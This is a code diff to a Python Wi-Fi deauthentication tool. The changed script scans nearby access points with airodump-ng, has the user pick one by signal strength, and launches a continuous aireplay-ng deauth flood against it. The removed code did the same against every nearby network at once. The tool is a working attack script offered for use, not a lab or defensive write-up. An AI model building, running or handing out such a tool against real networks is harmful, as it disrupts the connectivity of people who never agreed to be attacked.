@@ -6,12 +6,20 @@ import os
 import signal
 import shutil
 import sys
+import csv
 from colorama import Fore, Style, init
 
 init(autoreset=True)
 
 REQUIRED_CMDS = ["iw", "aireplay-ng", "ip"]
 SHORTCUT_PATH = "/usr/local/bin/deauther"
+
+def check_superuser():
+    """Return True if running as root, otherwise exit program."""
+    if os.geteuid() != 0:
+        print("{Fore.RED}[!] {Fore.WHITE}This tool must be run as root!")
+        sys.exit(1)
+    return True
 
 def check_dependencies():
     missing = [cmd for cmd in REQUIRED_CMDS if not shutil.which(cmd)]
@@ -39,121 +47,116 @@ def uninstall_script():
         print(f"{Fore.YELLOW}[!] {Fore.WHITE}No installation found at {SHORTCUT_PATH}")
     sys.exit(0)
 
-def get_channel_with_iw(bssid, iface):
-    print(f"{Fore.GREEN}[+] {Fore.WHITE}Getting channel for BSSID {bssid} via iw scan...")
+def start_deauth(bssid, channel, iface):
+    """Launch mdk4 inside xterm and wait until it's closed or interrupted."""
+    # place xterm at bottom-right using negative geometry offsets
+    # ensure interface is on target channel, then run aireplay-ng deauth (continuous)
+    set_channel(iface, channel)
+    cmd = ["xterm", "-geometry", "80x24-0-0", "-e", "bash", "-lc",
+           f"aireplay-ng -0 0 -a {bssid} {iface}"]
+    p = None
     try:
-        subprocess.run(["ip", "link", "set", iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["iw", iface, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["ip", "link", "set", iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-        scan_output = subprocess.check_output(["iw", iface, "scan"], stderr=subprocess.DEVNULL).decode()
-        cell_blocks = scan_output.split("BSS ")
-        for block in cell_blocks:
-            if bssid.lower() in block.lower():
-                match = re.search(r"DS Parameter set: channel (\d+)", block)
-                if match:
-                    return match.group(1)
-    except Exception as e:
-        print(f"{Fore.RED}[!] {Fore.WHITE}Error while scanning: {e}")
-    return None
-
-def scan_all_bssids(iface):
-    """Scan nearby APs and return list of (bssid, channel) tuples."""
-    results = []
-    try:
-        scan_output = subprocess.check_output(["iw", iface, "scan"], stderr=subprocess.DEVNULL).decode()
-        cell_blocks = scan_output.split("BSS ")
-        for block in cell_blocks:
-            # find bssid at start of block
-            m = re.match(r"([0-9a-f:]{17})", block.strip(), re.I)
-            if not m:
-                continue
-            bssid = m.group(1).lower()
-            chan_match = re.search(r"DS Parameter set: channel (\d+)", block)
-            if chan_match:
-                channel = chan_match.group(1)
-            else:
-                # try alternative channel pattern
-                chan2 = re.search(r"channel (\d+)", block)
-                channel = chan2.group(1) if chan2 else None
-            results.append((bssid, channel))
-    except Exception as e:
-        print(f"{Fore.RED}[!] {Fore.WHITE}Error while scanning for APs: {e}")
-    # deduplicate preserving order
-    seen = set()
-    deduped = []
-    for b, c in results:
-        if b not in seen:
-            seen.add(b)
-            deduped.append((b, c))
-    return deduped
-
-def start_deauth_process(bssid, iface):
-    """Start a deauth subprocess for a single BSSID and return the Popen object."""
-    try:
-        p = subprocess.Popen([
-            "aireplay-ng", "--deauth", "0", "-a", bssid, iface
-        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return p
-    except Exception as e:
-        print(f"{Fore.RED}[!] {Fore.WHITE}Failed to start deauth for {bssid}: {e}")
-        return None
-
-def start_deauth_all(bssids_with_ch, iface):
-    """Deauth all provided BSSIDs. Groups by channel and hops to each channel launching attacks."""
-    procs = []
-    try:
-        # group by channel
-        channels = {}
-        for bssid, chan in bssids_with_ch:
-            channels.setdefault(chan or "auto", []).append(bssid)
-
-        for chan, bssid_list in channels.items():
-            if chan != "auto":
-                print(f"{Fore.GREEN}[+] {Fore.WHITE}Setting channel {chan} on {iface}...")
-                set_channel(iface, chan)
-            else:
-                print(f"{Fore.YELLOW}[!] {Fore.WHITE}Unknown channel for some APs, leaving current channel for them")
-
-            for bssid in bssid_list:
-                print(f"{Fore.GREEN}[+] {Fore.WHITE}Launching deauth against {bssid} on channel {chan}")
-                p = start_deauth_process(bssid, iface)
-                if p:
-                    procs.append(p)
-
-        print(f"{Fore.GREEN}[+] {Fore.WHITE}Attacking {len(procs)} targets. Press CTRL+C to stop...")
-        signal.pause()
+        p = subprocess.Popen(cmd)
+        p.wait()
     except KeyboardInterrupt:
-        print(f"\n{Fore.GREEN}[+] {Fore.WHITE}Stopping attacks and cleaning up...")
+        print(f"\n{Fore.GREEN}[+] {Fore.WHITE}Attack stopped by user.")
     finally:
-        for p in procs:
+        if p:
             try:
                 p.terminate()
             except Exception:
                 pass
-
-def start_deauth(bssid, iface):
-    try:
-        subprocess.Popen([
-            "aireplay-ng", "--deauth", "0", "-a", bssid, iface
-        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        signal.pause()
-    except KeyboardInterrupt:
-        print(f"\n{Fore.GREEN}[+] {Fore.WHITE}Attack stopped by user.")
-
-def set_monitor_mode(iface):
-    subprocess.run(["ip", "link", "set", iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.run(["iw", iface, "set", "monitor", "none"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.run(["ip", "link", "set", iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+        print(f"{Fore.GREEN}[+] {Fore.WHITE}Attack stopped.")
 
 def set_channel(iface, channel):
     subprocess.run(["iw", iface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+def run_airodump_scan(iface):
+    print(f"{Fore.GREEN}[+] {Fore.WHITE}Launching airodump-ng in xterm...")
+
+    base = "/tmp/deauther_scan"
+    csv_path = base + "-01.csv"
+
+    # hapus file lama
+    if os.path.exists(csv_path):
+        os.remove(csv_path)
+
+    try:
+        # buka xterm tanpa -hold biar ga nge-freeze quitting
+        cmd = f"airodump-ng --write {base} --output-format csv {iface}"
+        # buka xterm di pojok kanan bawah (geometry: 100x30, offset negatif)
+        subprocess.run(["xterm", "-geometry", "100x30-0-0", "-e", "bash", "-lc", cmd])
+    except Exception as e:
+        print(f"{Fore.RED}[!] {Fore.WHITE}Failed to launch airodump-ng: {e}")
+        sys.exit(1)
+
+    # cek file hasil
+    if not os.path.exists(csv_path):
+        print(f"{Fore.RED}[!] {Fore.WHITE}CSV not generated! Expected at: {csv_path}")
+        sys.exit(1)
+
+    return csv_path
+
+def parse_airodump_csv(csv_file):
+    aps = []
+
+    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
+        reader = csv.reader(f)
+        ap_section = False
+
+        for row in reader:
+            # Detect start of AP section
+            if len(row) > 0 and row[0].strip() == "BSSID":
+                ap_section = True
+                continue
+
+            # Stop when client section starts
+            if ap_section and len(row) > 0 and row[0].strip() == "Station MAC":
+                break
+
+            if ap_section and len(row) > 5:
+                try:
+                    bssid = row[0].strip()
+                    channel = row[3].strip()
+                    rssi = int(row[8].strip())  # RSSI/POWER column
+                    ssid = row[13].strip()
+                except:
+                    continue
+
+                if re.match(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", bssid.lower()):
+                    aps.append((bssid, channel, rssi, ssid))
+
+    # Sort by strongest signal (RSSI highest → closer to 0)
+    aps.sort(key=lambda x: x[2], reverse=True)
+
+    return aps
+
+def interactive_choose(aps):
+    print(f"\n{Fore.CYAN}{Style.BRIGHT}----- Detected Access Points -----{Style.NORMAL}")
+
+    for i, (bssid, ch, rssi, ssid) in enumerate(aps):
+        print(f"{Fore.YELLOW}{i+1}. {Fore.WHITE}{ssid}\t"
+              f"{Fore.GREEN}CH:{ch}\t"
+              f"{Fore.CYAN}RSSI:{rssi}\t"
+              f"{Fore.CYAN}BSSID:{bssid}")
+
+    print()
+    choice = input(f"{Fore.GREEN}[?] {Fore.WHITE}Choose target number: ")
+
+    try:
+        choice = int(choice) - 1
+        if choice < 0 or choice >= len(aps):
+            raise ValueError
+    except ValueError:
+        print(f"{Fore.RED}[!] {Fore.WHITE}Invalid choice!")
+        sys.exit(1)
+
+    return aps[choice][0], aps[choice][1]
+
 def main():
     parser = argparse.ArgumentParser(description="Simple Deauth Tool by Dx4 and JonX")
     parser.add_argument("-i", "--iface", help="Wireless interface (ex: wlan0)")
-    parser.add_argument("-b", "--bssid", help="Target BSSID")
-    parser.add_argument("--all", action="store_true", help="Deauth all nearby APs")
     parser.add_argument("--uninstall", action="store_true", help="Uninstall the deauther shortcut")
     args = parser.parse_args()
 
@@ -161,41 +164,31 @@ def main():
         uninstall_script()
 
     print_banner()
+    check_superuser()
     check_dependencies()
 
-    if not args.iface or (not args.bssid and not args.all):
+    if not args.iface:
         parser.print_help()
         return
-
-    # If user requested to deauth all nearby APs
-    if args.all:
-        print(f"{Fore.GREEN}[+] {Fore.WHITE}Scanning for nearby APs on {args.iface}...")
-        bssids = scan_all_bssids(args.iface)
-        if not bssids:
-            print(f"{Fore.RED}[!] {Fore.WHITE}No APs found during scan!")
-            return
-
-        print(f"{Fore.GREEN}[+] {Fore.WHITE}Setting interface {args.iface} to monitor mode...")
-        set_monitor_mode(args.iface)
-
-        start_deauth_all(bssids, args.iface)
+    
+    if not args.iface:
+        print(f"{Fore.RED}[!] {Fore.WHITE}Interface is required with --scan")
         return
 
-    # Single target flow
-    channel = get_channel_with_iw(args.bssid, args.iface)
-    if not channel:
-        print(f"{Fore.RED}[!] {Fore.WHITE}Failed to find channel for BSSID!")
+    csv_file = run_airodump_scan(args.iface)
+    aps = parse_airodump_csv(csv_file)
+
+    if not aps:
+        print(f"{Fore.RED}[!] {Fore.WHITE}No APs found in scan!")
         return
 
-    print(f"{Fore.GREEN}[+] {Fore.WHITE}Found channel: {channel}")
-    print(f"{Fore.GREEN}[+] {Fore.WHITE}Setting interface {args.iface} to monitor mode on channel {channel}...")
-    set_monitor_mode(args.iface)
-    set_channel(args.iface, channel)
+    target_bssid, channel = interactive_choose(aps)
+    bssid = target_bssid
 
-    print(f"{Fore.GREEN}[+] {Fore.WHITE}Attacking {args.bssid} using interface {args.iface}")
+    print(f"{Fore.GREEN}[+] {Fore.WHITE}Attacking {bssid} using interface {args.iface}")
     print(f"{Fore.GREEN}[+] {Fore.WHITE}Press CTRL+C to stop the attack...")
 
-    start_deauth(args.bssid, args.iface)
+    start_deauth(bssid, channel, args.iface)
 
 if __name__ == "__main__":
     main()
